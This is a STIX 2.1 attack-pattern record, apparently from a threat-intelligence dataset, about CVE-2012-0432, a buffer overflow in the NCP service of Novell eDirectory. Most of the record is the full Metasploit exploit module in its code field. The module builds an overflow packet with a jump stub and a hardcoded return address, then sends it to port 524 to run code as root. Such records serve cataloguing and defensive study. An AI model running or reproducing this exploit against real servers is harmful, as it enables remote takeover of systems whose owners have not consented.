{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--25ef122c-f675-4387-8f5c-c93fec656781",
    "created": "2024-08-14T16:57:46.992141Z",
    "modified": "2024-08-14T16:57:46.992144Z",
    "name": "Novell eDirectory 8 Buffer Overflow",
    "description": " This exploit abuses a buffer overflow vulnerability in Novell eDirectory. The vulnerability exists in the ndsd daemon, specifically in the NCP service, while parsing a specially crafted Keyed Object Login request. It allows remote code execution with root privileges. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/novell_edirectory_ncp_bof.rb",
            "external_id": "novell_edirectory_ncp_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0432"
        },
        {
            "source_name": "reference",
            "url": "http://www.novell.com/support/kb/doc.php?id=3426981"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2013/Jan/97"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'Novell eDirectory 8 Buffer Overflow',\n      'Description'     => %q{\n          This exploit abuses a buffer overflow vulnerability in Novell eDirectory. The\n        vulnerability exists in the ndsd daemon, specifically in the NCP service, while\n        parsing a specially crafted Keyed Object Login request. It allows remote code\n        execution with root privileges.\n      },\n      'Author'          =>\n        [\n          'David Klein', # Vulnerability Discovery\n          'Gary Nilson', # Exploit\n          'juan vazquez' # Metasploit module\n        ],\n      'References'      =>\n        [\n          [ 'CVE', '2012-0432'],\n          [ 'OSVDB', '88718'],\n          [ 'BID', '57038' ],\n          [ 'EDB', '24205' ],\n          [ 'URL', 'http://www.novell.com/support/kb/doc.php?id=3426981' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2013/Jan/97' ]\n        ],\n      'DisclosureDate'  => '2012-12-12',\n      'Platform'        => 'linux',\n      'Privileged'      => true,\n      'Arch'            => ARCH_X86,\n      'Payload'         =>\n        {\n\n        },\n      'Targets'         =>\n        [\n          [ 'Novell eDirectory 8.8.7 v20701.33/ SLES 10 SP3',\n            {\n              'Ret' => 0x080a4697, # jmp esi from ndsd\n              'Offset' => 58\n            }\n          ]\n        ],\n      'DefaultTarget'   => 0\n    ))\n\n    register_options([Opt::RPORT(524),])\n  end\n\n  def check\n    connect\n    sock.put(connection_request)\n    res = sock.get_once(-1, 10)\n    disconnect\n    if res.nil? or res[8, 2].unpack(\"n\")[0] != 0x3333 or res[15, 1].unpack(\"C\")[0] != 0\n      # res[8,2] => Reply Type\n      # res[15,1] => Connection Status\n      return Exploit::CheckCode::Safe\n    end\n    return Exploit::CheckCode::Detected\n  end\n\n  def connection_request\n    pkt =  \"\\x44\\x6d\\x64\\x54\" # NCP TCP id\n    pkt << \"\\x00\\x00\\x00\\x17\" # request_size\n    pkt << \"\\x00\\x00\\x00\\x01\" # version\n    pkt << \"\\x00\\x00\\x00\\x00\" # reply buffer size\n    pkt << \"\\x11\\x11\"         # cmd => create service connection\n    pkt << \"\\x00\"             # sequence number\n    pkt << \"\\x00\"             # connection number\n    pkt << \"\\x00\"             # task number\n    pkt << \"\\x00\"             # reserved\n    pkt << \"\\x00\"             # request code\n\n    return pkt\n  end\n\n  def exploit\n\n    connect\n\n    print_status(\"Sending Service Connection Request...\")\n    sock.put(connection_request)\n    res = sock.get_once(-1, 10)\n    if res.nil? or res[8, 2].unpack(\"n\")[0] != 0x3333 or res[15, 1].unpack(\"C\")[0] != 0\n      # res[8,2] => Reply Type\n      # res[15,1] => Connection Status\n      fail_with(Failure::UnexpectedReply, \"Service Connection failed\")\n    end\n    print_good(\"Service Connection successful\")\n\n    pkt = \"\\x44\\x6d\\x64\\x54\"  # NCP TCP id\n    pkt << \"\\x00\\x00\\x00\\x00\" # request_size (filled later)\n    pkt << \"\\x00\\x00\\x00\\x01\" # version (1)\n    pkt << \"\\x00\\x00\\x00\\x05\" # reply buffer size\n    pkt << \"\\x22\\x22\"         # cmd\n    pkt << \"\\x01\"             # sequence number\n    pkt << res[11]            # connection number\n    pkt << \"\\x00\"             # task number\n    pkt << \"\\x00\"             # reserved\n    pkt << \"\\x17\"             # Login Object FunctionCode (23)\n    pkt << \"\\x00\\xa7\"         # SubFuncStrucLen\n    pkt << \"\\x18\"             # SubFunctionCode\n    pkt << \"\\x90\\x90\"         # object type\n    pkt << \"\\x50\"             # ClientNameLen\n    pkt << rand_text(7)\n    jmp_payload = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $+#{target['Offset'] + 4}\").encode_string\n    pkt << jmp_payload # first byte is the memcpy length, must be bigger than 62 to to overwrite EIP\n    pkt << rand_text(target['Offset'] - jmp_payload.length)\n    pkt << [target.ret].pack(\"V\")\n    pkt << payload.encoded\n\n    pkt[4,4] = [pkt.length].pack(\"N\")\n\n    print_status(\"Sending Overflow on Keyed Object Login...\")\n    sock.put(pkt)\n    sock.get_once(-1, 10)\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-12-12",
    "x_mitre_platforms": [
        "linux'"
    ]
}